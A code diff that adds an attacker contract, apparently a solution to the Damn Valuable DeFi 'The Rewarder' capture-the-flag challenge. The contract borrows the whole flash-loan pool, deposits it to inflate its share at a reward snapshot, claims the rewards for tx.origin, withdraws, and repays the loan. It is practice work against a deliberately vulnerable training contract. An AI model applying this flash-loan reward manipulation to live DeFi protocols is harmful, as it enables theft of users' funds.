@@ -106,3 +106,42 @@ contract TheRewarderPool {
         return block.timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
     }
 }
+
+import {FlashLoanerPool} from "./FlashLoanerPool.sol";  // my import
+import "../DamnValuableToken.sol";
+import "hardhat/console.sol";
+
+contract TheRewarderPoolAttacker {
+    DamnValuableToken liquidityToken;
+    FlashLoanerPool flashLoanerPool;
+    TheRewarderPool theRewarderPool;
+    RewardToken rewardToken;
+    
+    constructor(FlashLoanerPool _flashLoanerPool, TheRewarderPool _theRewarderPool){
+        flashLoanerPool = _flashLoanerPool;
+        liquidityToken = flashLoanerPool.liquidityToken();
+        theRewarderPool = _theRewarderPool;
+        rewardToken = theRewarderPool.rewardToken();
+    }
+
+    function attack() public {
+        uint totalBalance = liquidityToken.balanceOf(address(flashLoanerPool));
+        console.log("totalBalance", totalBalance);
+        flashLoanerPool.flashLoan(totalBalance);
+
+    }
+
+    function receiveFlashLoan(uint256 _amount) public {
+        liquidityToken.approve(address(theRewarderPool), _amount);
+        theRewarderPool.deposit(_amount);
+        console.log("deposit done");
+        uint rewards = theRewarderPool.distributeRewards();
+        console.log("rewards", rewards);
+        console.log("rewardToken.balanceOf(address(this))", rewardToken.balanceOf(address(this)));
+        rewardToken.transfer(tx.origin, rewards);
+        theRewarderPool.withdraw(_amount);
+        liquidityToken.transfer(address(flashLoanerPool), _amount);
+        console.log("rewardToken.balanceOf(tx.origin)", rewardToken.balanceOf(tx.origin));
+        
+    }
+}
